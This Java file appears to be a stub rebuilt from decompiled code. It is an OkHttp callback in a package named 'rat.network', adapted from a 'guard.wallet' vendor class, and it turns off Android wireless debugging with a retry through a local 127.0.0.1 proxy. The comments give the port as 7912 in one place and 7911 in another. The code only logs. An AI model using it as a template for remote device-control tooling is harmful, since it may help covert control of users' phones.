package com.vendor.rat.network;

// ADAPT: vendor = com.guard.wallet.http.c (CloseWifiDebugCallback)

import android.util.Log;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * CloseWifiDebugCallback - 关闭无线调试回调
 * vendor: 解析 ApiResult<Boolean>，成功后日志 "关闭无线调试成功"
 * 失败时尝试本地代理 l.f("http://127.0.0.1:7912") 重试
 */
public final class c implements Callback {

    private static final String TAG = "CloseWifiDebugCallback";

    @Override
    public void onFailure(Call call, IOException e) {
        Log.e(TAG, "request failed", e);
        // ADAPT: vendor retries via local proxy l.f() if URL contains 127.0.0.1:7911
    }

    @Override
    public void onResponse(Call call, Response response) throws IOException {
        try {
            String body = response.body() != null ? response.body().string() : "";
            Log.d(TAG, "response: " + response.code());
            // ADAPT: vendor parses ApiResult<Boolean>, logs "关闭无线调试成功"
            // on failure retries via local proxy if URL contains 127.0.0.1:7911
        } catch (Exception e) {
            Log.e(TAG, "parse error", e);
        } finally {
            response.close();
        }
    }
}
